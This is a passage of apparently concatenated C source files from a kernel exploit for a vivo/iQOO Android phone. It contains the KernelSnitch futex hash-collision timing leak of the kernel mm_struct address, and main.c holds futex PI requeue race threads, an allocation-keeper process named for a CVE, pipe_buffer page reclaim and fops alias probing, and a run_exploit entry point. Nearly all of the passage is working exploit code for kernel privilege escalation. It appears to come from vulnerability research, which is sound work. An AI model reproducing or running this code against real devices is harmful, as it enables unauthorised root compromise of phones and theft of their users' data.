              "invalid measurement count\n");
    ASSERT_pr((average > 0 && average <= repeat_measurement),
              "invalid measurement average\n");
    ks->appended_futexes = appended_futexes;
    ks->repeat_measurement = repeat_measurement;
    ks->average = average;
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
void kernelsnitch_set_search_bounds(
    struct kernelsnitch_shared_state *ks, size_t identity_start,
    size_t identity_end, size_t min_object_index, size_t max_object_index,
    int exact_identity_partition)
{
    size_t objects_per_slab =
        (KS_PAGE_SIZE << ks->mm_slab_order) / ks->mm_struct_sz;
    ASSERT_pr((identity_start < identity_end),
              "invalid KernelSnitch identity bounds\n");
    ASSERT_pr((min_object_index < objects_per_slab),
              "invalid KernelSnitch minimum object index\n");
    ASSERT_pr((min_object_index <= max_object_index &&
               max_object_index < objects_per_slab),
              "invalid KernelSnitch maximum object index\n");
    ks->identity_start = identity_start;
    ks->identity_end = identity_end;
    ks->identity_diff =
        (ks->identity_end - ks->identity_start) / ks->thread_cnt;
    ks->min_object_index = min_object_index;
    ks->max_object_index = max_object_index;
    ks->exact_identity_partition = exact_identity_partition;
}
#endif

/**
 * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
{
    #define ID 128
#ifndef KERNELSNITCH_THRESHOLD_MULT
#define KERNELSNITCH_THRESHOLD_MULT 10
#endif
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
#define KERNELSNITCH_COLLISION_CONFIRMATIONS 1
#endif
#endif
    size_t count = 0;
    size_t wanted;
    size_t futex_addr;
    size_t id;
    ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
    ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
    wanted = ks->collisions - 1;

    size_t approx_time = MIN(
        __measure(ks, (size_t)&ks->futexes[0]),
        __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));

    // piled-up hash bucket ID 128
    // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
    __increase(ks, ID, ks->appended_futexes);
    if (ks->verbose) pr_info("start finding collisisons\n");

    // find futex user space address which collide with the piled-up hash bucket ID 128
    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
    if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
    for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
        if (id >= FUTEX_SZ)
            break;
        futex_addr = (size_t)&ks->futexes[id];
        ks->times[i] = __measure(ks, futex_addr);
        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
            int confirmed = 1;
            for (size_t confirmation = 1;
                 confirmation < KERNELSNITCH_COLLISION_CONFIRMATIONS;
                 ++confirmation) {
                if (__measure(ks, futex_addr) <=
                    (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
                    confirmed = 0;
                    break;
                }
            }
            if (!confirmed)
                continue;
#endif
            count++;
            ks->futex_addrs[count] = futex_addr;
            if (ks->verbose) pr_info("  %016zx\n", futex_addr);
        }
    }
    if (wanted == count) {
        if (ks->verbose) pr_info("found %zd collisisons\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_FOUND;
    } else {
        pr_warning("only found %zd collisions -> cannot continue\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
    }
    __decrease(ks);
}
size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND), "wrong state\n");
    return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
}

/**
 * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
    if (ks->verbose) pr_info("start bruteforcing\n");
    reset_cpu_pin();

    for (size_t i = 0; i < ks->thread_cnt; ++i) {
        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
        mm_leak_arg->ks = ks;
        mm_leak_arg->range.id = i;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
        mm_leak_arg->range.start =
            ks->identity_start + ks->identity_diff*i;
        mm_leak_arg->range.end = i + 1 == ks->thread_cnt
            ? ks->identity_end
            : ks->identity_start + ks->identity_diff*(i+1);
        if (ks->exact_identity_partition) {
            size_t slab_size = KS_PAGE_SIZE << ks->mm_slab_order;
            mm_leak_arg->range.start &= ~(slab_size - 1);
            mm_leak_arg->range.end &= ~(slab_size - 1);
            if (mm_leak_arg->range.start < ks->identity_start)
                mm_leak_arg->range.start = ks->identity_start;
            if (mm_leak_arg->range.end > ks->identity_end)
                mm_leak_arg->range.end = ks->identity_end;
        } else {
            if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
                mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
            if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
                mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
        }
#else
        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
#endif
        SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
    }
    for (size_t i = 0; i < ks->thread_cnt; ++i)
        pthread_join(ks->tids[i], 0);
    ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
}

/**
 * Cleanup phase for KernelSnitch
 * @arg ks: shared KernelSnitch state
 * @return the found mm_struct or -1 for not found
 */
size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
    munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
    ks->times = 0;
    munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
    ks->tids = 0;
    munmap((void *)ks->futex_addrs, sizeof(size_t)*(ks->collisions + 1));
    ks->futex_addrs = 0;
    munmap((void *)ks->futexes, FUTEX_SZ);
    ks->futexes = 0;
    size_t ret = ks->mm_struct;
    if (ks->verbose) pr_info("done\n");
    munmap(ks, sizeof(struct kernelsnitch_shared_state));
    return ret;
}

```

---

## kernelsnitch/timeutils.h

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/kernelsnitch/timeutils.h`

```c
#pragma once

#define _GNU_SOURCE
#include <sched.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

static inline size_t rdtsc_begin(void)
{
    unsigned long long vct;
    asm volatile("isb" ::: "memory");
    asm volatile("mrs %0, cntvct_el0" : "=r"(vct));
    asm volatile("isb" ::: "memory");
    return (size_t)vct;
}

static inline size_t rdtsc_end(void)
{
    unsigned long long vct;
    asm volatile("isb" ::: "memory");
    asm volatile("mrs %0, cntvct_el0" : "=r"(vct));
    asm volatile("isb" ::: "memory");
    return (size_t)vct;
}

```

---

## kernelsnitch/utils.h

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/kernelsnitch/utils.h`

```c
#pragma once

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <err.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sched.h>
#include <time.h>
#include <string.h>
#include <sys/resource.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <inttypes.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/prctl.h>

#ifdef ANDROID_APP_NO_LKM
#include <android/log.h>
#endif

#ifndef HIDEMINMAX
#define MAX(X,Y) (((X) > (Y)) ? (X) : (Y))
#define MIN(X,Y) (((X) < (Y)) ? (X) : (Y))
#endif

// #define DEBUG
// #define PANIC

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define SYSCHK(x) ({ \
        typeof(x) __res = (x); \
        if (__res == (typeof(x))-1) \
            pr_error("SYSCHK(" #x "): %m\n"); \
        __res; \
    })
#define SYSCHK_pr(x, fmt) ({ \
        typeof(x) __res = (x); \
        if (__res == (typeof(x))-1) \
            pr_error(fmt); \
        __res; \
    })

#ifdef PANIC
#define PR_ASSERT pr_error
#else
#define PR_ASSERT pr_warning
#endif

#define ASSERT(cond) do { \
        if (!!(cond) == 0) \
            PR_ASSERT("[detected] assert(" #cond ")\n"); \
    } while (0)
#define ASSERT_pr(cond, fmt, ...) do { \
        if (!!(cond) == 0) \
            PR_ASSERT("[detected] assert(%s): " fmt, #cond, ##__VA_ARGS__); \
    } while (0)

#ifdef DEBUG
#ifdef ANDROID_APP_NO_LKM
#define pr_error(fmt, ...) do { \
        __android_log_print(ANDROID_LOG_ERROR, "google_poc_app", "[!] %s:%d " fmt, __FILE__, __LINE__, ##__VA_ARGS__); \
        exit(-1); \
    } while (0)
#define pr_warning(fmt, ...) do { \
        __android_log_print(ANDROID_LOG_WARN, "google_poc_app", "[-] %s:%d " fmt, __FILE__, __LINE__, ##__VA_ARGS__); \
    } while (0)
#define pr_info(fmt, ...) do { \
        __android_log_print(ANDROID_LOG_INFO, "google_poc_app", "[*] %s:%d " fmt, __FILE__, __LINE__, ##__VA_ARGS__); \
    } while (0)
#define pr_success(fmt, ...) do { \
        __android_log_print(ANDROID_LOG_INFO, "google_poc_app", "[+] %s:%d " fmt, __FILE__, __LINE__, ##__VA_ARGS__); \
    } while (0)
#else
#define pr_error(fmt, ...) do { \
        printf(COLOR_RED "[!] %s:%d " COLOR_DEFAULT fmt, __FILE__, __LINE__, ##__VA_ARGS__); \
        exit(-1); \
    } while (0)
#define pr_warning(fmt, ...) do { \
        printf(COLOR_RED "[-] %s:%d " COLOR_DEFAULT fmt, __FILE__, __LINE__, ##__VA_ARGS__); \
    } while (0)
#define pr_info(fmt, ...) do { \
        printf(COLOR_YELLOW "[*] %s:%d " COLOR_DEFAULT fmt, __FILE__, __LINE__, ##__VA_ARGS__); \
    } while (0)
#define pr_success(fmt, ...) do { \
        printf(COLOR_GREEN "[+] %s:%d " COLOR_DEFAULT fmt, __FILE__, __LINE__, ##__VA_ARGS__); \
    } while (0)
#endif
#else
#ifdef ANDROID_APP_NO_LKM
#define pr_error(fmt, ...) do { \
        __android_log_print(ANDROID_LOG_ERROR, "google_poc_app", "[!] " fmt, ##__VA_ARGS__); \
        exit(-1); \
    } while (0)
#define pr_warning(fmt, ...) do { \
        __android_log_print(ANDROID_LOG_WARN, "google_poc_app", "[-] " fmt, ##__VA_ARGS__); \
    } while (0)
#define pr_info(fmt, ...) do { \
        __android_log_print(ANDROID_LOG_INFO, "google_poc_app", "[*] " fmt, ##__VA_ARGS__); \
    } while (0)
#define pr_success(fmt, ...) do { \
        __android_log_print(ANDROID_LOG_INFO, "google_poc_app", "[+] " fmt, ##__VA_ARGS__); \
    } while (0)
#else
#define pr_error(fmt, ...) do { \
        printf(COLOR_RED "[!] " COLOR_DEFAULT fmt, ##__VA_ARGS__); \
        exit(-1); \
    } while (0)
#define pr_warning(fmt, ...) do { \
        printf(COLOR_RED "[-] " COLOR_DEFAULT fmt, ##__VA_ARGS__); \
    } while (0)
#define pr_info(fmt, ...) do { \
        printf(COLOR_YELLOW "[*] " COLOR_DEFAULT fmt, ##__VA_ARGS__); \
    } while (0)
#define pr_success(fmt, ...) do { \
        printf(COLOR_GREEN "[+] " COLOR_DEFAULT fmt, ##__VA_ARGS__); \
    } while (0)
#endif
#endif

#define wait_input(fmt, ...) do { \
        pr_info(fmt, ##__VA_ARGS__); getchar(); \
    } while (0)

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static inline void pin_to_core(size_t core)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    SYSCHK(sched_setaffinity(0, sizeof(cpu_set_t), &cpuset));
}

static inline void reset_cpu_pin(void)
{
    cpu_set_t cpuset;
    memset(&cpuset, 0xff, sizeof(cpu_set_t));
    SYSCHK(sched_setaffinity(0, sizeof(cpu_set_t), &cpuset));
}

static inline void set_limit(void)
{
    struct rlimit r;
    SYSCHK(getrlimit(RLIMIT_NOFILE, &r));
    r.rlim_cur = r.rlim_max;
    SYSCHK(setrlimit(RLIMIT_NOFILE, &r));
    SYSCHK(getrlimit(RLIMIT_NPROC, &r));
    r.rlim_cur = r.rlim_max;
    SYSCHK(setrlimit(RLIMIT_NPROC, &r));
}

static inline void set_unbuffer(void)
{
    SYSCHK(setvbuf(stdin,  NULL, _IONBF, 0));
    SYSCHK(setvbuf(stdout, NULL, _IONBF, 0));
    SYSCHK(setvbuf(stderr, NULL, _IONBF, 0));
}

static inline void set_proc_name(const char *name)
{
    SYSCHK(prctl(PR_SET_NAME, name, 0, 0, 0));
}

static inline size_t gettime_ns(void)
{
    struct timespec t;
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &t));
    return t.tv_nsec + t.tv_sec*1000000000ULL;
}

static void write_file(const char *path, const char *data)
{
    int fd = SYSCHK(open(path, O_WRONLY));
    if (write(fd, data, strlen(data)) != (ssize_t)strlen(data))
        pr_error("write(%s): %m\n", path);
    close(fd);
}


static inline void set_user_namespace(void)
{
    uid_t uid = getuid();
    gid_t gid = getgid();

    SYSCHK(unshare(CLONE_NEWUSER | CLONE_NEWNET));

    write_file("/proc/self/setgroups", "deny");

    char map[128];
    snprintf(map, sizeof(map), "0 %d 1\n", uid);
    write_file("/proc/self/uid_map", map);

    snprintf(map, sizeof(map), "0 %d 1\n", gid);
    write_file("/proc/self/gid_map", map);
}

static inline void hexdump(const void* data, size_t size)
{
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

static inline unsigned long parse_ul(const char *s, const char *name)
{
    char *end = NULL;
    unsigned long v;

    errno = 0;
    v = strtoul(s, &end, 0);
    if (!(errno == 0 && end && *end == '\0'))
        pr_error("invalid %s: %s\n", name, s);
    return v;
}

static inline unsigned long parse_xl(const char *s, const char *name)
{
    char *end = NULL;
    unsigned long v;

    errno = 0;
    v = strtoul(s, &end, 16);
    if (!(errno == 0 && end && *end == '\0'))
        pr_error("invalid %s: %s\n", name, s);
    return v;
}

```

---

## main.c

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/main.c`

```c
#include "common.h"

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
#endif
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
static void durable_log_checkpoint(const char *stage) {
  struct stat st;
  pr_info("durable log checkpoint stage=%s\n", stage);
  SYSCHK(fflush(NULL));
  SYSCHK(fstat(STDOUT_FILENO, &st));
  if (!S_ISREG(st.st_mode)) {
    pr_warning("durable log checkpoint skipped stage=%s mode=%#o\n",
               stage, st.st_mode);
    return;
  }
  SYSCHK(fsync(STDOUT_FILENO));
}
#endif

#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        int consumer_nice = PSELECT_CONSUMER_NICE;
        errno = 0;
        struct timespec punch_start;
        clock_gettime(CLOCK_MONOTONIC, &punch_start);
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        int sched_errno = errno;
        struct timespec punch_end;
        clock_gettime(CLOCK_MONOTONIC, &punch_end);
        long punch_ms = (punch_end.tv_sec - punch_start.tv_sec) * 1000 +
                        (punch_end.tv_nsec - punch_start.tv_nsec) / 1000000;
        pr_info("pselect consumer punch tid=%d ret=%ld errno=%d nice=%d "
                "ms=%ld\n",
                tid, sched_ret, sched_errno, consumer_nice, punch_ms);
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        } else {
          pr_warning("pselect consumer sched_setattr ret=%ld errno=%d tid=%d nice=%d\n",
                     sched_ret, sched_errno, tid, consumer_nice);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }
}
#endif

static pid_t spawn_allocation_keeper(void) {
  pid_t child = SYSCHK(fork());
  if (child != 0) {
    return child;
  }

  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
  syscall(SYS_setsid);

  int null_fd = (int)syscall(
      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (null_fd != fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  } else {
    syscall(SYS_close, STDIN_FILENO);
    syscall(SYS_close, STDOUT_FILENO);
    syscall(SYS_close, STDERR_FILENO);
  }

  struct timespec hold = {
    .tv_sec = 86400,
    .tv_nsec = 0,
  };
  for (;;) {
    syscall(SYS_nanosleep, &hold, NULL);
  }
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
    APP_FOPS_DATA_ALIAS_DIAG_ONLY
static int fops_data_alias_deferred;
static uintptr_t fops_data_alias_deferred_target;
static uint64_t fops_data_alias_deferred_initial;

static int verify_fops_data_alias_before_production(void) {
  uintptr_t saved_gate_page = p0_gate_page_struct;
  uintptr_t saved_probe_page = p0_probe_page_struct;
#if defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) && \
    APP_P0_FINGERPRINT_INVERSE_SLIDE
  uintptr_t aliases[] = {
    data_addr(ASHMEM_MISC_FOPS),
  };
  const char *names[] = {"probe-derived"};
#else
  uintptr_t aliases[] = {
    p0_data_alias(ASHMEM_MISC_FOPS) + slide_p0_offset,
    p0_data_alias(ASHMEM_MISC_FOPS),
  };
  const char *names[] = {"with-slide", "without-slide"};
#endif
  uint64_t expected = text_addr(ASHMEM_FOPS);
  int verified = 0;
  int abort_verification = 0;

  for (size_t index = 0; index < sizeof(aliases) / sizeof(aliases[0]);
       index++) {
    int fresh_attempt = 1;
    int search_batch = 0;
#ifdef APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES
    const int max_search_batches = APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES;
#else
    const int max_search_batches = APP_FOPS_FRESH_PAGE_ATTEMPTS;
#endif
    int prepare_oracle = 1;
    while (fresh_attempt <= APP_FOPS_FRESH_PAGE_ATTEMPTS &&
           search_batch < max_search_batches) {
      fops_data_probe_addr = aliases[index];
      fops_data_probe_active = 1;
      if (prepare_oracle) {
        reset_pipe_attempt();
        if (!prepare_p0_pipe_oracle()) {
          pr_error("fops data alias pipe preparation failed candidate=%s\n",
                   names[index]);
          abort_verification = 1;
          break;
        }
        prepare_oracle = 0;
      }
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      search_batch++;
      pr_info("fops data alias search candidate=%s batch=%d/%d "
              "gate_attempt=%d/%d base=%016zx\n",
              names[index], search_batch, max_search_batches,
              fresh_attempt, APP_FOPS_FRESH_PAGE_ATTEMPTS, page_base);
      if (!page_base) {
        pr_warning("fops data alias page unavailable candidate=%s "
                   "fresh=%d/%d\n",
                   names[index], fresh_attempt,
                   APP_FOPS_FRESH_PAGE_ATTEMPTS);
#ifndef APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES
        fresh_attempt++;
        prepare_oracle = 1;
#endif
        continue;
      }

      int gate_triggered =
          app_trigger_fops_oracle_slot(P0_ORACLE_GATE_SLOT);
      int gate_result = gate_triggered
          ? verify_p0_pipe_oracle_gate()
          : 0;
      pr_info("fops data alias gate candidate=%s fresh=%d/%d "
              "triggered=%d result=%d page=%016zx\n",
              names[index], fresh_attempt,
              APP_FOPS_FRESH_PAGE_ATTEMPTS, gate_triggered,
              gate_result, page_base);
      if (gate_result == 0) {
        pr_warning("fops data alias reclaim miss candidate=%s "
                   "fresh=%d/%d\n",
                   names[index], fresh_attempt,
                   APP_FOPS_FRESH_PAGE_ATTEMPTS);
        fresh_attempt++;
        prepare_oracle = 1;
        continue;
      }

      app_publish_p0_dirty();
      if (gate_result < 0) {
        pr_error("fops data alias gate changed unexpected pages "
                 "candidate=%s\n", names[index]);
        app_trigger_fops_oracle_slot(P0_ORACLE_GATE_RESTORE_SLOT);
        abort_verification = 1;
        break;
      }

      int alias_triggered =
          app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_SLOT);
#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
    APP_FOPS_DEFER_ALIAS_READBACK
      /*
       * Keep the redirected pipe_buffer queued across production slot 4.
       * Reading it now would only reconfirm the pre-write ashmem_fops value;
       * reading it after slot 4 directly measures the target word and avoids
       * treating the ashmem/configfs CFI route as a memory-read oracle.
       */
      int result = alias_triggered ? 1 : 0;
      int gate_restored =
          app_trigger_fops_oracle_slot(P0_ORACLE_GATE_RESTORE_SLOT);
      if (alias_triggered && gate_restored) {
        fops_data_alias_deferred = 1;
        fops_data_alias_deferred_target = fops_data_probe_addr;
        fops_data_alias_deferred_initial = expected;
      }
      pr_info("fops data alias deferred candidate=%s address=%016zx "
              "initial=%016llx gate=%d triggered=%d armed=%d "
              "gate_restored=%d page=%016zx\n",
              names[index], fops_data_probe_addr,
              (unsigned long long)expected, gate_result,
              alias_triggered, fops_data_alias_deferred,
              gate_restored, page_base);
#else
      int result = alias_triggered
          ? verify_p0_pipe_data_page(fops_data_probe_addr, expected)
          : 0;
      int gate_restored =
          app_trigger_fops_oracle_slot(P0_ORACLE_GATE_RESTORE_SLOT);
      int alias_restored = alias_triggered
          ? app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_RESTORE_SLOT)
          : 0;
      pr_info("fops data alias candidate=%s address=%016zx "
              "expected=%016llx gate=%d triggered=%d result=%d "
              "gate_restored=%d alias_restored=%d page=%016zx\n",
              names[index], fops_data_probe_addr,
              (unsigned long long)expected, gate_result,
              alias_triggered, result, gate_restored,
              alias_restored, page_base);
#endif
#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
    APP_FOPS_DEFER_ALIAS_READBACK
      if (!gate_restored || !alias_triggered ||
          !fops_data_alias_deferred) {
        pr_error("fops data alias deferred arm failed candidate=%s\n",
                 names[index]);
        abort_verification = 1;
        break;
      }
      if (result == 1) {
        verified = 1;
      }
#else
      if (!gate_restored || (alias_triggered && !alias_restored)) {
        pr_error("fops data alias restore failed candidate=%s\n",
                 names[index]);
        abort_verification = 1;
        break;
      }
      if (result == 1 && alias_triggered && alias_restored) {
#if !defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) || \
    !APP_P0_FINGERPRINT_INVERSE_SLIDE
        data_alias_uses_slide = index == 0;
#endif
        verified = 1;
      }
#endif
      break;
    }
    if (verified || abort_verification) {
      break;
    }
  }

  p0_gate_page_struct = saved_gate_page;
  p0_probe_page_struct = saved_probe_page;
  fops_data_probe_active = 0;
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  if (verified) {
    pr_info("fops data alias retaining verified payload page=%016zx "
            "pipe_page=%016zx production_slot=%d\n",
            page_base, pipebuf_page_base, P0_ORACLE_PRODUCTION_SLOT);
  } else {
    reset_pipe_attempt();
  }
#else
  reset_pipe_attempt();
#endif
  pr_info("fops data alias selected verified=%d runtime_slide=%08zx "
          "uses_slide=%d\n",
          verified, slide_p0_offset, data_alias_uses_slide);
  return verified;
}
#endif

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  disable_rseq_for_thread();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  pin_to_core(CORE);
